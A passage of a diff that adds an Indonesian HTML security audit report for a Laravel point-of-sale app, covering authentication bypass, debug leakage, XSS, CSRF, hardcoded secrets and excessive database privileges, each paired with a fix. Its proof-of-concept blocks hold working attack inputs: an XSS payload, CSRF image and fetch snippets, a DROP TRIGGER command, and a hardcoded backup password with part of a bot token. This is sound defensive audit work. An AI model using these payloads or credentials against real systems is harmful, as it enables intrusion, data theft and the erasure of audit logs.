+              <td>Bypass DisallowedRawHtml saat nama tag yang dilarang mengakhiri literal raw-HTML</td>
+              <td><code>&gt;=1.3.0, &lt;=2.10.1</code></td>
+            </tr>
+            <tr>
+              <td><code>league/commonmark</code></td>
+              <td><span class="severity-badge sev-high">Tinggi</span></td>
+              <td>PKSA-m4t9-vsgq-8khn</td>
+              <td>Quadratic-time Denial of Service (DoS) pada block-start scan ekstensi GFM Table</td>
+              <td><code>&gt;=2.0.0, &lt;=2.10.1</code></td>
+            </tr>
+            <tr>
+              <td><code>symfony/http-foundation</code></td>
+              <td><span class="severity-badge sev-high">Tinggi</span></td>
+              <td>CVE-2026-108082<br><span style="font-size: 10px; color: var(--text-dim);">PKSA-xmwy-rmx5-m7h4</span></td>
+              <td>ReDoS pada HeaderUtils::split() yang dapat dipicu via header request Cache-Control</td>
+              <td><code>&gt;=7.4.0, &lt;7.4.19 / &gt;=8.1.0, &lt;8.1.7</code></td>
+            </tr>
+            <tr>
+              <td><code>symfony/mime</code></td>
+              <td><span class="severity-badge sev-medium">Sedang</span></td>
+              <td>CVE-2026-45070<br><span style="font-size: 10px; color: var(--text-dim);">PKSA-wtxr-p26d-nn42</span></td>
+              <td>Email Header Injection via karakter non-token pada parameter nama MIME</td>
+              <td><code>&gt;=7.4.0, &lt;7.4.22 / &gt;=8.1.0, &lt;8.1.10</code></td>
+            </tr>
+          </tbody>
+        </table>
+        <div style="margin-top: 16px; font-size: 13px; color: var(--text-muted);">
+          <strong>Langkah Mitigasi Dependensi:</strong> Jalankan perintah <code>composer update league/commonmark symfony/http-foundation symfony/mime --with-dependencies</code>
+          untuk menaikkan dependensi ke versi patch bebas kerentanan.
+        </div>
+      </div>
+    </section>
+
+    <!-- Detailed Findings Section -->
+    <section id="daftar-temuan">
+      <div class="section-title-wrap">
+        <div class="section-title">Daftar Rinci Temuan Audit Keamanan (27 Temuan)</div>
+        <div class="section-subtitle">Dianalisis, diverifikasi, dan didokumentasikan dengan PoC serta solusi</div>
+      </div>
+
+      <!-- Finding Card: SEC-01 -->
+      <article class="finding-card" id="SEC-01">
+        <div class="finding-header">
+          <div class="finding-id-badge-group">
+            <span class="finding-id">SEC-01</span>
+            <span class="severity-badge sev-critical">Kritis (CRITICAL)</span>
+            <span class="cwe-tag">CWE-306 / CWE-284</span>
+          </div>
+          <h2 class="finding-title">Bypass Middleware Autentikasi dan Otorisasi pada Seluruh Rute Administrator</h2>
+        </div>
+
+        <div class="finding-body">
+          <div class="finding-meta-row">
+            <div class="finding-meta-item">
+              <span class="finding-meta-label">Lokasi Berkas:</span>
+              <span class="finding-meta-val">bootstrap/app.php (baris 16-18), routes/admin_*.php</span>
+            </div>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Deskripsi & Dampak Kerentanan</div>
+            <div class="content-block-desc">Pada berkas bootstrap/app.php, seluruh rute administrasi (routes/admin_*.php) dimuat secara otomatis melalui callback &#x27;then&#x27; dengan hanya menerapkan middleware grup &#x27;web&#x27;. Berkas-berkas rute individual seperti admin_dashboard.php, admin_barang.php, admin_pembelian.php, admin_log.php, admin_toko.php, admin_batas_stok.php, admin_backup.php, dan admin_pengguna.php tidak mendefinisikan middleware &#x27;auth&#x27; maupun &#x27;role:ADMIN&#x27;. Akibatnya, seluruh modul administrasi toko terbuka untuk publik tanpa memerlukan proses login sama sekali. Penyerang eksternal dapat melihat laporan penjualan, memodifikasi master barang, mengubah harga produk, mengunduh salinan basis data, serta membuat atau menonaktifkan akun staf toko.</div>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Langkah Reproduksi (Proof of Concept)</div>
+            <div class="code-term-header">
+              <span>Terminal / HTTP Proof-of-Concept</span>
+              <span>Bash</span>
+            </div>
+            <pre><code># Pengujian akses langsung ke endpoint admin tanpa cookie sesi atau autentikasi:
+curl -s -o /dev/null -w &quot;HTTP Status: %{http_code}\n&quot; http://localhost/admin/dashboard
+curl -s -o /dev/null -w &quot;HTTP Status: %{http_code}\n&quot; http://localhost/admin/barang
+curl -s -o /dev/null -w &quot;HTTP Status: %{http_code}\n&quot; http://localhost/admin/pengguna
+
+# Hasil:
+# HTTP Status: 200 (Seluruh halaman panel admin dapat diakses bebas tanpa pengalihan ke /masuk)</code></pre>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Rekomendasi Perbaikan & Solusi Kode</div>
+            <div class="code-term-header">
+              <span>Solusi Perbaikan Kode</span>
+              <span>PHP / Laravel</span>
+            </div>
+            <pre><code>// bootstrap/app.php
+// Terapkan middleware &#x27;auth&#x27; dan &#x27;role:ADMIN&#x27; secara terisolasi saat memuat rute admin:
+foreach (glob(base_path(&#x27;routes/admin_*.php&#x27;)) as $adminRoute) {
+    Route::middleware([&#x27;web&#x27;, &#x27;auth&#x27;, &#x27;role:ADMIN&#x27;])-&gt;group($adminRoute);
+}</code></pre>
+          </div>
+        </div>
+      </article>
+
+      <!-- Finding Card: SEC-02 -->
+      <article class="finding-card" id="SEC-02">
+        <div class="finding-header">
+          <div class="finding-id-badge-group">
+            <span class="finding-id">SEC-02</span>
+            <span class="severity-badge sev-critical">Kritis (CRITICAL)</span>
+            <span class="cwe-tag">CWE-306 / CWE-284</span>
+          </div>
+          <h2 class="finding-title">Bypass Middleware Autentikasi dan Otorisasi pada Seluruh Rute Kasir POS</h2>
+        </div>
+
+        <div class="finding-body">
+          <div class="finding-meta-row">
+            <div class="finding-meta-item">
+              <span class="finding-meta-label">Lokasi Berkas:</span>
+              <span class="finding-meta-val">bootstrap/app.php (baris 21-23), routes/kasir_*.php</span>
+            </div>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Deskripsi & Dampak Kerentanan</div>
+            <div class="content-block-desc">Sama halnya dengan rute administrasi, seluruh rute modul kasir (routes/kasir_*.php) dimuat di bootstrap/app.php hanya dengan middleware grup &#x27;web&#x27;. Pada file routes/kasir_transaksi.php dan routes/kasir_stok.php, terdapat catatan komentar pengembang bahwa middleware &#x27;auth&#x27; dan &#x27;role:KASIR&#x27; sengaja dinonaktifkan sementara untuk kebutuhan prototipe antarmuka Figma dan belum diaktifkan kembali. Kondisi ini menyebabkan seluruh antarmuka operasional kasir (/kasir/dashboard, /kasir/stok, /kasir/saldo, /kasir/transaksi, /kasir/infobarang) dapat diakses secara publik tanpa autentikasi, memungkinkan pihak luar mengintip perputaran saldo modal kasir dan memanipulasi keranjang kasir.</div>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Langkah Reproduksi (Proof of Concept)</div>
+            <div class="code-term-header">
+              <span>Terminal / HTTP Proof-of-Concept</span>
+              <span>Bash</span>
+            </div>
+            <pre><code># Pengujian akses langsung ke modul kasir:
+curl -s -o /dev/null -w &quot;HTTP Status: %{http_code}\n&quot; http://localhost/kasir/dashboard
+curl -s -o /dev/null -w &quot;HTTP Status: %{http_code}\n&quot; http://localhost/kasir/saldo
+curl -s -o /dev/null -w &quot;HTTP Status: %{http_code}\n&quot; http://localhost/kasir/transaksi
+
+# Hasil:
+# HTTP Status: 200 (Antarmuka kasir dan saldo kas terbuka tanpa perlindungan sesi kasir)</code></pre>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Rekomendasi Perbaikan & Solusi Kode</div>
+            <div class="code-term-header">
+              <span>Solusi Perbaikan Kode</span>
+              <span>PHP / Laravel</span>
+            </div>
+            <pre><code>// bootstrap/app.php
+// Bungkus seluruh rute kasir dengan proteksi sesi autentikasi dan peran kasir:
+foreach (glob(base_path(&#x27;routes/kasir_*.php&#x27;)) as $kasirRoute) {
+    Route::middleware([&#x27;web&#x27;, &#x27;auth&#x27;, &#x27;role:KASIR&#x27;])-&gt;group($kasirRoute);
+}</code></pre>
+          </div>
+        </div>
+      </article>
+
+      <!-- Finding Card: SEC-03 -->
+      <article class="finding-card" id="SEC-03">
+        <div class="finding-header">
+          <div class="finding-id-badge-group">
+            <span class="finding-id">SEC-03</span>
+            <span class="severity-badge sev-critical">Kritis (CRITICAL)</span>
+            <span class="cwe-tag">CWE-200 / CWE-215</span>
+          </div>
+          <h2 class="finding-title">Konfigurasi Mode Debug Aktif (APP_DEBUG=true) Mengekspos Kredensial dan Struktur Internal</h2>
+        </div>
+
+        <div class="finding-body">
+          <div class="finding-meta-row">
+            <div class="finding-meta-item">
+              <span class="finding-meta-label">Lokasi Berkas:</span>
+              <span class="finding-meta-val">.env (baris 4), config/app.php</span>
+            </div>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Deskripsi & Dampak Kerentanan</div>
+            <div class="content-block-desc">Pengaturan &#x27;APP_DEBUG=true&#x27; aktif pada konfigurasi lingkungan (.env). Apabila terjadi exception atau kesalahan HTTP 500, Laravel akan menampilkan halaman debug Ignition secara interaktif. Halaman ini membocorkan seluruh variabel lingkungan termasuk kunci enkripsi aplikasi (APP_KEY), nama pengguna dan kata sandi basis data (DB_USERNAME, DB_PASSWORD), token rahasia Bot Telegram, stack trace pemanggilan kode PHP, jalur berkas fisik server, serta struktur kueri SQL internal yang sedang diproses.</div>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Langkah Reproduksi (Proof of Concept)</div>
+            <div class="code-term-header">
+              <span>Terminal / HTTP Proof-of-Concept</span>
+              <span>Bash</span>
+            </div>
+            <pre><code># Memicu error runtime dengan mengirim parameter ilegal atau memanggil ID tidak valid:
+curl -i &quot;http://localhost/admin/barang?filter=error_trigger&quot;
+
+# Respon HTTP 500 memuat dokumen HTML Ignition yang menampilkan:
+# - Environment Variables: DB_PASSWORD=laravel, TELEGRAM_BOT_TOKEN=8905123250:AAEm...
+# - Full Directory Server Path: /home/archbox/tugas/...
+# - Source Code Snippets and Database Query Log</code></pre>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Rekomendasi Perbaikan & Solusi Kode</div>
+            <div class="code-term-header">
+              <span>Solusi Perbaikan Kode</span>
+              <span>PHP / Laravel</span>
+            </div>
+            <pre><code># .env (Lingkungan Produksi)
+# Pastikan mode debug dinonaktifkan dan environment diatur ke &#x27;production&#x27;:
+APP_ENV=production
+APP_DEBUG=false</code></pre>
+          </div>
+        </div>
+      </article>
+
+      <!-- Finding Card: SEC-04 -->
+      <article class="finding-card" id="SEC-04">
+        <div class="finding-header">
+          <div class="finding-id-badge-group">
+            <span class="finding-id">SEC-04</span>
+            <span class="severity-badge sev-high">Tinggi (HIGH)</span>
+            <span class="cwe-tag">CWE-285 / CWE-613</span>
+          </div>
+          <h2 class="finding-title">Akun Staf Berstatus Nonaktif Masih Dapat Login dan Memperoleh Sesi Kerja</h2>
+        </div>
+
+        <div class="finding-body">
+          <div class="finding-meta-row">
+            <div class="finding-meta-item">
+              <span class="finding-meta-label">Lokasi Berkas:</span>
+              <span class="finding-meta-val">app/Http/Controllers/LoginController.php (baris 39-45), app/Http/Controllers/OtpController.php (baris 30-33)</span>
+            </div>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Deskripsi & Dampak Kerentanan</div>
+            <div class="content-block-desc">Pada proses autentikasi dua langkah (2FA), method LoginController::authenticate hanya memverifikasi kesesuaian username dan pencocokan hash password (Hash::check) tanpa melakukan pengecekan atribut status akun. Demikian pula pada OtpController::verify, setelah kode verifikasi Telegram dinyatakan valid, sistem langsung mengeksekusi Auth::login($user). Akun staf atau kasir yang telah dinonaktifkan (status = &#x27;NONAKTIF&#x27;) oleh pemilik toko tetap dapat melewati login langkah pertama, menerima OTP, dan memperoleh akses penuh ke sistem.</div>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Langkah Reproduksi (Proof of Concept)</div>
+            <div class="code-term-header">
+              <span>Terminal / HTTP Proof-of-Concept</span>
+              <span>Bash</span>
+            </div>
+            <pre><code># Skenario pengujian:
+# 1. Admin menonaktifkan staf via query/antarmuka: UPDATE pengguna SET status = &#x27;NONAKTIF&#x27; WHERE username = &#x27;kasir&#x27;;
+# 2. Pengguna &#x27;kasir&#x27; melakukan POST ke /masuk dengan password yang valid;
+# 3. Sistem menerima kredensial, membuat pending_2fa_user_id di sesi, dan mengirimkan kode OTP;
+# 4. Pengguna memasukkan OTP di /verifikasi;
+# 5. Sistem mengarahkan pengguna ke /kasir/dashboard dengan sesi aktif.</code></pre>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Rekomendasi Perbaikan & Solusi Kode</div>
+            <div class="code-term-header">
+              <span>Solusi Perbaikan Kode</span>
+              <span>PHP / Laravel</span>
+            </div>
+            <pre><code>// 1. Pada app/Http/Controllers/LoginController.php (authenticate):
+if (! $user || ! Hash::check($request-&gt;password, $user-&gt;password)) {
+    return back()-&gt;withErrors([&#x27;login&#x27; =&gt; &#x27;Username atau password salah.&#x27;])-&gt;onlyInput(&#x27;username&#x27;);
+}
+if (strtoupper($user-&gt;status ?? &#x27;&#x27;) === &#x27;NONAKTIF&#x27;) {
+    return back()-&gt;withErrors([&#x27;login&#x27; =&gt; &#x27;Akun Anda telah dinonaktifkan. Hubungi pengelola toko.&#x27;])-&gt;onlyInput(&#x27;username&#x27;);
+}
+
+// 2. Pada app/Http/Controllers/OtpController.php (verify):
+if (strtoupper($user-&gt;status ?? &#x27;&#x27;) === &#x27;NONAKTIF&#x27;) {
+    $request-&gt;session()-&gt;forget(&#x27;pending_2fa_user_id&#x27;);
+    return redirect()-&gt;route(&#x27;login&#x27;)-&gt;withErrors([&#x27;login&#x27; =&gt; &#x27;Akun Anda tidak aktif.&#x27;]);
+}</code></pre>
+          </div>
+        </div>
+      </article>
+
+      <!-- Finding Card: SEC-05 -->
+      <article class="finding-card" id="SEC-05">
+        <div class="finding-header">
+          <div class="finding-id-badge-group">
+            <span class="finding-id">SEC-05</span>
+            <span class="severity-badge sev-high">Tinggi (HIGH)</span>
+            <span class="cwe-tag">CWE-79</span>
+          </div>
+          <h2 class="finding-title">DOM-based Cross-Site Scripting (XSS) pada Antarmuka POS Kasir</h2>
+        </div>
+
+        <div class="finding-body">
+          <div class="finding-meta-row">
+            <div class="finding-meta-item">
+              <span class="finding-meta-label">Lokasi Berkas:</span>
+              <span class="finding-meta-val">resources/views/kasir/transaksi/index.blade.php (baris 1221-1254)</span>
+            </div>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Deskripsi & Dampak Kerentanan</div>
+            <div class="content-block-desc">Fungsi renderKartuBarang pada antarmuka kasir merender daftar produk pencarian AJAX ke DOM menggunakan string concatenation ke kontainer.innerHTML. Pembersihan input variabel namaParam hanya mengganti karakter kutip tunggal (&#x27;) dan backslash (\\), namun membiarkan tanda kutip ganda (&quot;) dan kurung sudut (&lt;, &gt;). Karena tag button aksi dibungkus atribut berkutip ganda &#x27;onclick=&quot;tambahItemKeranjang(&#x27;...&#x27;, &#x27;${namaParam}&#x27;, ...)&quot;&#x27;, penyisipan tanda kutip ganda pada nama item barang akan memutus atribut onclick dan menginjeksi atribut HTML baru seperti onfocus atau onload, yang mengeksekusi skrip JavaScript berbahaya dalam konteks browser kasir.</div>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Langkah Reproduksi (Proof of Concept)</div>
+            <div class="code-term-header">
+              <span>Terminal / HTTP Proof-of-Concept</span>
+              <span>Bash</span>
+            </div>
+            <pre><code>// Administrator atau pengguna memasukkan data barang baru dengan nama:
+Buku Sinar Dunia&quot; onfocus=&quot;alert(document.domain)&quot; autofocus tabindex=&quot;1
+
+// Saat kasir membuka menu kasir/transaksi dan mencari barang, DOM dirender menjadi:
+&lt;button type=&quot;button&quot; onclick=&quot;tambahItemKeranjang(&#x27;ITM01&#x27;, &#x27;Buku Sinar Dunia&quot; onfocus=&quot;alert(document.domain)&quot; autofocus tabindex=&quot;1&#x27;, 4500, 20, &#x27;pcs&#x27;)&quot;&gt;
+
+// Hasil: Atribut autofocus dan onfocus memicu eksekusi skrip JavaScript secara instan.</code></pre>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Rekomendasi Perbaikan & Solusi Kode</div>
+            <div class="code-term-header">
+              <span>Solusi Perbaikan Kode</span>
+              <span>PHP / Laravel</span>
+            </div>
+            <pre><code>// resources/views/kasir/transaksi/index.blade.php
+// Hindari inline event handler onclick dengan interpolasi string. Gunakan atribut data-* dan event delegation:
+html += `
+    &lt;button
+        type=&quot;button&quot;
+        class=&quot;btn-tambah-item touch-target px-3 py-1.5 bg-emerald-50 text-emerald-700 rounded-lg&quot;
+        data-kode=&quot;${encodeURIComponent(item.kode_item || &#x27;&#x27;)}&quot;
+        data-nama=&quot;${escapeHtml(item.nama_item || &#x27;&#x27;)}&quot;
+        data-harga=&quot;${Number(item.harga_jual) || 0}&quot;
+        data-stok=&quot;${Number(item.stok) || 0}&quot;
+        data-satuan=&quot;${escapeHtml(item.satuan || &#x27;pcs&#x27;)}&quot;
+    &gt;+ Tambah&lt;/button&gt;
+`;
+
+// Tangani klik melalui event listener terpusat:
+kontainer.addEventListener(&#x27;click&#x27;, function(e) {
+    const btn = e.target.closest(&#x27;.btn-tambah-item&#x27;);
+    if (!btn) return;
+    tambahItemKeranjang(
+        decodeURIComponent(btn.dataset.kode),
+        btn.dataset.nama,
+        Number(btn.dataset.harga),
+        Number(btn.dataset.stok),
+        btn.dataset.satuan
+    );
+});</code></pre>
+          </div>
+        </div>
+      </article>
+
+      <!-- Finding Card: SEC-06 -->
+      <article class="finding-card" id="SEC-06">
+        <div class="finding-header">
+          <div class="finding-id-badge-group">
+            <span class="finding-id">SEC-06</span>
+            <span class="severity-badge sev-high">Tinggi (HIGH)</span>
+            <span class="cwe-tag">CWE-352 / CWE-652</span>
+          </div>
+          <h2 class="finding-title">Mutasi State Melalui HTTP GET Mengakibatkan Kerentanan Cross-Site Request Forgery (CSRF)</h2>
+        </div>
+
+        <div class="finding-body">
+          <div class="finding-meta-row">
+            <div class="finding-meta-item">
+              <span class="finding-meta-label">Lokasi Berkas:</span>
+              <span class="finding-meta-val">app/Http/Controllers/Admin/PenggunaController.php (baris 24-35), app/Http/Controllers/Admin/BatasStokController.php (baris 23-30)</span>
+            </div>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Deskripsi & Dampak Kerentanan</div>
+            <div class="content-block-desc">Pada PenggunaController::index dan BatasStokController::index, controller memeriksa parameter kueri GET &#x27;$request-&gt;has(&#x27;action&#x27;)&#x27; dan mengeksekusi perubahan data sensitif seperti penonaktifan akun (toggle_status), reset kata sandi pengguna (reset_password), dan pembaruan batas stok minimum. Protokol HTTP menetapkan metode GET harus aman (safe) dan idempoten. Karena framework Laravel tidak menerapkan verifikasi token CSRF pada permintaan HTTP GET, aksi-aksi kritis ini dapat dipicu oleh pihak luar melalui serangan CSRF (misalnya menyematkan tautan pada tag &lt;img&gt; di situs web lain atau pesan email).</div>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Langkah Reproduksi (Proof of Concept)</div>
+            <div class="code-term-header">
+              <span>Terminal / HTTP Proof-of-Concept</span>
+              <span>Bash</span>
+            </div>
+            <pre><code>&lt;!-- Kode HTML yang ditempatkan penyerang pada situs web eksternal: --&gt;
+&lt;img src=&quot;http://localhost/admin/pengguna?action=toggle_status&amp;id_pengguna=1&amp;status=NONAKTIF&quot; width=&quot;0&quot; height=&quot;0&quot; /&gt;
+
+&lt;!-- Saat administrator Toko Firo yang sedang login membuka halaman eksternal tersebut,
+     browser otomatis mengirimkan cookie sesi ke server Toko Firo.
+     Hasil: Akun administrator ID 1 langsung berubah status menjadi NONAKTIF tanpa konfirmasi. --&gt;</code></pre>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Rekomendasi Perbaikan & Solusi Kode</div>
+            <div class="code-term-header">
+              <span>Solusi Perbaikan Kode</span>
+              <span>PHP / Laravel</span>
+            </div>
+            <pre><code>// 1. Hapus percabangan mutasi state dari method index() pada controller.
+// 2. Definisikan rute khusus dengan metode HTTP POST / PATCH pada file rute terkait:
+
+// routes/admin_pengguna.php
+Route::patch(&#x27;/admin/pengguna/{id}/status&#x27;, [PenggunaController::class, &#x27;toggleStatus&#x27;])-&gt;name(&#x27;admin.pengguna.toggle-status&#x27;);
+Route::post(&#x27;/admin/pengguna/{id}/reset-password&#x27;, [PenggunaController::class, &#x27;resetPassword&#x27;])-&gt;name(&#x27;admin.pengguna.reset-password&#x27;);
+
+// 3. Pastikan formulir Blade menyertakan direktif @csrf dan @method(&#x27;PATCH&#x27;).</code></pre>
+          </div>
+        </div>
+      </article>
+
+      <!-- Finding Card: SEC-07 -->
+      <article class="finding-card" id="SEC-07">
+        <div class="finding-header">
+          <div class="finding-id-badge-group">
+            <span class="finding-id">SEC-07</span>
+            <span class="severity-badge sev-high">Tinggi (HIGH)</span>
+            <span class="cwe-tag">CWE-352</span>
+          </div>
+          <h2 class="finding-title">Pengecualian Validasi CSRF Terlalu Luas pada Pola Rute &#x27;api/*&#x27;</h2>
+        </div>
+
+        <div class="finding-body">
+          <div class="finding-meta-row">
+            <div class="finding-meta-item">
+              <span class="finding-meta-label">Lokasi Berkas:</span>
+              <span class="finding-meta-val">bootstrap/app.php (baris 28-32)</span>
+            </div>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Deskripsi & Dampak Kerentanan</div>
+            <div class="content-block-desc">Konfigurasi $middleware-&gt;validateCsrfTokens pada bootstrap/app.php mengecualikan pola wildcard &#x27;api/*&#x27;. Pengecualian ini menonaktifkan seluruh mekanisme perlindungan token CSRF untuk seluruh rute API yang ada maupun yang akan ditambahkan di masa mendatang. Jika terdapat endpoint API yang mengandalkan sesi autentikasi berbasis cookie peramban, penyerang dapat mengeksekusi permintaan lintas-asal (cross-origin) dari peramban korban tanpa perlu menyertakan token CSRF yang valid.</div>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Langkah Reproduksi (Proof of Concept)</div>
+            <div class="code-term-header">
+              <span>Terminal / HTTP Proof-of-Concept</span>
+              <span>Bash</span>
+            </div>
+            <pre><code>// Skrip berbahaya pada domain penyerang (attacker.com):
+fetch(&#x27;http://localhost/api/transaksi/simpan&#x27;, {
+    method: &#x27;POST&#x27;,
+    credentials: &#x27;include&#x27;,
+    headers: { &#x27;Content-Type&#x27;: &#x27;application/json&#x27; },
+    body: JSON.stringify({ item_id: 1, nominal: 500000 })
+});
+// Hasil: Permintaan diterima dan diproses server karena pola &#x27;api/*&#x27; tidak diverifikasi oleh middleware CSRF.</code></pre>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Rekomendasi Perbaikan & Solusi Kode</div>
+            <div class="code-term-header">
+              <span>Solusi Perbaikan Kode</span>
+              <span>PHP / Laravel</span>
+            </div>
+            <pre><code>// bootstrap/app.php
+// Batasi pengecualian token CSRF hanya pada rute webhook spesifik dari pihak ketiga:
+$middleware-&gt;validateCsrfTokens(except: [
+    &#x27;api/telegram/webhook&#x27;,
+]);</code></pre>
+          </div>
+        </div>
+      </article>
+
+      <!-- Finding Card: SEC-08 -->
+      <article class="finding-card" id="SEC-08">
+        <div class="finding-header">
+          <div class="finding-id-badge-group">
+            <span class="finding-id">SEC-08</span>
+            <span class="severity-badge sev-high">Tinggi (HIGH)</span>
+            <span class="cwe-tag">CWE-798 / CWE-259</span>
+          </div>
+          <h2 class="finding-title">Kredensial Sensitif Terekspos dan Kata Sandi Cadangan Hardcoded</h2>
+        </div>
+
+        <div class="finding-body">
+          <div class="finding-meta-row">
+            <div class="finding-meta-item">
+              <span class="finding-meta-label">Lokasi Berkas:</span>
+              <span class="finding-meta-val">.env (baris 67-68), app/Services/BackupService.php (baris 94), config/services.php</span>
+            </div>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Deskripsi & Dampak Kerentanan</div>
+            <div class="content-block-desc">Berkas .env memuat token otentikasi aktif Bot Telegram (&#x27;8905123250:A***********************************&#x27;) serta Chat ID grup. Selain itu, pada method BackupService::createEncryptedZip, kata sandi enkripsi berkas cadangan ZIP memiliki nilai fallback hardcoded string statis: &#x27;TokoFiroSecure2026!Key&#x27;. Jika variabel lingkungan tidak didefinisikan, seluruh berkas arsip database diekspor menggunakan kunci statis yang dapat dibaca pada kode sumber.</div>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Langkah Reproduksi (Proof of Concept)</div>
+            <div class="code-term-header">
+              <span>Terminal / HTTP Proof-of-Concept</span>
+              <span>Bash</span>
+            </div>
+            <pre><code># 1. Verifikasi token Bot Telegram aktif via Telegram API publik:
+curl -s https://api.telegram.org/bot8905123250:A***********************************/getMe
+# Respon: {&quot;ok&quot;:true,&quot;result&quot;:{&quot;id&quot;:8905123250,&quot;is_bot&quot;:true,&quot;first_name&quot;:&quot;Toko Firo Bot&quot;...}}
+
+# 2. Ekstraksi arsip cadangan terenkripsi menggunakan password fallback:
+unzip -P &#x27;TokoFiroSecure2026!Key&#x27; backup-tokofiro-20261031-120000.zip
+# Hasil: Seluruh isi skema dan data database SQL berhasil terekstrak.</code></pre>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Rekomendasi Perbaikan & Solusi Kode</div>
+            <div class="code-term-header">
+              <span>Solusi Perbaikan Kode</span>
+              <span>PHP / Laravel</span>
+            </div>
+            <pre><code>// 1. Cabut (revoke) token bot lama melalui BotFather Telegram dan terbitkan token baru.
+// 2. Hapus fallback password statis pada app/Services/BackupService.php:
+$password = config(&#x27;services.telegram.backup_password&#x27;);
+if (empty($password)) {
+    throw new \RuntimeException(&#x27;BACKUP_ENCRYPTION_PASSWORD belum dikonfigurasi pada .env!&#x27;);
+}</code></pre>
+          </div>
+        </div>
+      </article>
+
+      <!-- Finding Card: SEC-09 -->
+      <article class="finding-card" id="SEC-09">
+        <div class="finding-header">
+          <div class="finding-id-badge-group">
+            <span class="finding-id">SEC-09</span>
+            <span class="severity-badge sev-high">Tinggi (HIGH)</span>
+            <span class="cwe-tag">CWE-250 / CWE-272</span>
+          </div>
+          <h2 class="finding-title">Hak Akses Pengguna Basis Data Berlebihan (ALL PRIVILEGES) Merusak Integritas Audit</h2>
+        </div>
+
+        <div class="finding-body">
+          <div class="finding-meta-row">
+            <div class="finding-meta-item">
+              <span class="finding-meta-label">Lokasi Berkas:</span>
+              <span class="finding-meta-val">.env (baris 27-28), skema database MySQL (tabel log_aktivitas &amp; trigger)</span>
+            </div>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Deskripsi & Dampak Kerentanan</div>
+            <div class="content-block-desc">Kredensial database pada .env menggunakan akun &#x27;laravel&#x27; yang memiliki hak akses &#x27;ALL PRIVILEGES&#x27; pada seluruh basis data toko_firo. Sistem Toko Firo mengandalkan mekanisme trigger database (seperti trg_log_transaksi_immutable) untuk menjaga kekekalan catatan audit trail (immutable log). Dengan wewenang penuh, jika aplikasi dieksploitasi, penyerang dapat mengeksekusi perintah DDL seperti &#x27;DROP TRIGGER&#x27;, &#x27;TRUNCATE TABLE&#x27;, atau menonaktifkan trigger audit untuk menghilangkan jejak kejahatan.</div>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Langkah Reproduksi (Proof of Concept)</div>
+            <div class="code-term-header">
+              <span>Terminal / HTTP Proof-of-Concept</span>
+              <span>Bash</span>
+            </div>
+            <pre><code># Menghubungkan ke database dengan akun aplikasi web dan memeriksa hak istimewa:
+SHOW GRANTS FOR &#x27;laravel&#x27;@&#x27;%&#x27;;
+# Output: GRANT ALL PRIVILEGES ON `toko_firo`.* TO &#x27;laravel&#x27;@&#x27;%&#x27;
+
+# Menguji penonaktifan trigger audit immutable:
+DROP TRIGGER IF EXISTS trg_log_transaksi_immutable;
+# Hasil: Trigger berhasil dihapus tanpa halangan izin database.</code></pre>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Rekomendasi Perbaikan & Solusi Kode</div>
+            <div class="code-term-header">
+              <span>Solusi Perbaikan Kode</span>
+              <span>PHP / Laravel</span>
+            </div>
+            <pre><code>-- Terapkan prinsip hak akses minimal (Least Privilege) pada basis data MySQL:
+REVOKE ALL PRIVILEGES ON toko_firo.* FROM &#x27;laravel&#x27;@&#x27;%&#x27;;
+GRANT SELECT, INSERT, UPDATE, DELETE, EXECUTE ON toko_firo.* TO &#x27;laravel&#x27;@&#x27;%&#x27;;
+-- Jangan berikan hak DROP, ALTER, SUPER, TRIGGER, atau GRANT OPTION kepada pengguna aplikasi web.
+FLUSH PRIVILEGES;</code></pre>
+          </div>
+        </div>
+      </article>
+
+      <!-- Finding Card: SEC-10 -->
+      <article class="finding-card" id="SEC-10">
+        <div class="finding-header">
+          <div class="finding-id-badge-group">
+            <span class="finding-id">SEC-10</span>
+            <span class="severity-badge sev-high">Tinggi (HIGH)</span>
+            <span class="cwe-tag">CWE-614 / CWE-319</span>
+          </div>
+          <h2 class="finding-title">Ketiadaan Flag Secure pada Cookie Sesi Memungkinkan Penyadapan Sesi (Session Hijacking)</h2>
+        </div>
+
+        <div class="finding-body">
+          <div class="finding-meta-row">
+            <div class="finding-meta-item">
+              <span class="finding-meta-label">Lokasi Berkas:</span>
+              <span class="finding-meta-val">.env (tidak disetel), config/session.php (baris 172)</span>
+            </div>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Deskripsi & Dampak Kerentanan</div>
+            <div class="content-block-desc">Variabel SESSION_SECURE_COOKIE tidak disetel pada file .env, sehingga config(&#x27;session.secure&#x27;) menggunakan nilai default null (dievaluasi sebagai false). Cookie sesi pengguna (&#x27;toko_firo_session&#x27;) dikirimkan oleh peramban tanpa menyertakan atribut &#x27;Secure&#x27;. Jika aplikasi diakses melalui jaringan lokal atau Wi-Fi publik tanpa TLS ketat, cookie sesi dapat disadap melalui serangan Man-in-the-Middle (MitM) untuk membajak sesi login staf atau admin.</div>
+          </div>
+
+          <div class="content-block">
